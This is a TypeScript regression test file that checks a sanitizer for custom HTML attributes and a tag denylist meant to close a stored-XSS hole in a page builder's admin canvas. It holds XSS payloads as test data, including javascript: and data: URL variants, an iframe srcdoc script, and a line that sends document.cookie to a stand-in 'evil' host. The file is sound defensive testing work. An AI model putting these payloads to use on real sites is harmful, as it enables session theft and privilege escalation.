/**
 * Security regression tests: stored XSS via custom `htmlAttributes` + the
 * custom-tag escape hatch.
 *
 * The custom-HTML-attributes feature let an author attach arbitrary attribute
 * name/value pairs to base.link/button/image/container/text nodes. The name
 * allowlist blocked only event handlers, class, style, and reserved names, so
 * `href`, `srcdoc`, `formaction`, … were permitted and their values never
 * scheme-checked. Combined with the custom-tag escape hatch (which accepted
 * `iframe`, `base`, …), a low-privilege editor could store:
 *   - `href="javascript:…"` (shadowing a module's own checked href), or
 *   - an `<iframe srcdoc="<script>…">`,
 * which then executed for published-page visitors AND — because the admin
 * canvas renders these trusted modules same-origin as /admin with no
 * script-src CSP — in the admin origin when another admin opened the page
 * (session/credential theft, privilege escalation).
 *
 * These tests prove the single shared gate and the tag denylist close it.
 */
import { describe, expect, it } from 'bun:test'
import {
  isRenderableHtmlAttributeName,
  sanitizeRenderableHtmlAttribute,
} from '@core/htmlAttributes'
import { htmlAttributesAttr } from '@modules/base/shared/htmlAttributes'
import { resolveHtmlTag } from '@modules/base/utils/htmlTag'

describe('sanitizeRenderableHtmlAttribute — the shared custom-attribute gate', () => {
  it('drops srcdoc (raw-HTML iframe sink)', () => {
    expect(isRenderableHtmlAttributeName('srcdoc')).toBe(false)
    expect(sanitizeRenderableHtmlAttribute('srcdoc', '<script>alert(1)</script>')).toBeNull()
  })

  it('drops URL-bearing attributes carrying a dangerous scheme', () => {
    expect(sanitizeRenderableHtmlAttribute('href', 'javascript:alert(document.cookie)')).toBeNull()
    expect(sanitizeRenderableHtmlAttribute('href', 'JavaScript:alert(1)')).toBeNull()
    // browser tab/newline URL normalisation is applied before the scheme test
    expect(sanitizeRenderableHtmlAttribute('href', 'java\tscript:alert(1)')).toBeNull()
    expect(sanitizeRenderableHtmlAttribute('src', 'data:text/html,<script>alert(1)</script>')).toBeNull()
    expect(sanitizeRenderableHtmlAttribute('formaction', 'vbscript:msgbox(1)')).toBeNull()
    expect(sanitizeRenderableHtmlAttribute('xlink:href', 'javascript:alert(1)')).toBeNull()
  })

  it('drops event handlers, class, and style', () => {
    expect(sanitizeRenderableHtmlAttribute('onclick', 'steal()')).toBeNull()
    expect(sanitizeRenderableHtmlAttribute('class', 'x')).toBeNull()
    expect(sanitizeRenderableHtmlAttribute('style', 'x')).toBeNull()
  })

  it('keeps ordinary attributes and safe URLs unchanged', () => {
    expect(sanitizeRenderableHtmlAttribute('title', 'Hello world')).toBe('Hello world')
    expect(sanitizeRenderableHtmlAttribute('aria-label', 'Close')).toBe('Close')
    expect(sanitizeRenderableHtmlAttribute('data-foo', 'bar')).toBe('bar')
    expect(sanitizeRenderableHtmlAttribute('href', 'https://example.com/page')).toBe('https://example.com/page')
    expect(sanitizeRenderableHtmlAttribute('href', '/relative/path')).toBe('/relative/path')
  })
})

describe('htmlAttributesAttr — publisher string emit funnels through the gate', () => {
  it('emits only the safe attribute, dropping javascript: href and srcdoc', () => {
    const out = htmlAttributesAttr({
      href: 'javascript:fetch("//evil/?c="+document.cookie)',
      srcdoc: '<script>alert(document.domain)</script>',
      title: 'ok',
    })
    expect(out).toBe(' title="ok"')
  })
})

describe('resolveHtmlTag — custom-tag escape hatch rejects dangerous elements', () => {
  it.each(['iframe', 'script', 'object', 'embed', 'base', 'link', 'meta', 'style', 'frame', 'frameset', 'applet'])(
    'coerces a dangerous custom tag to div: %s',
    (tag) => {
      expect(resolveHtmlTag('custom', tag)).toBe('div')
      expect(resolveHtmlTag('custom', tag.toUpperCase())).toBe('div')
    },
  )

  it('still allows benign custom tags and built-ins', () => {
    expect(resolveHtmlTag('custom', 'aside')).toBe('aside')
    expect(resolveHtmlTag('custom', 'figure')).toBe('figure')
    expect(resolveHtmlTag('custom', 'my-widget')).toBe('my-widget')
    expect(resolveHtmlTag('section', undefined)).toBe('section')
  })
})
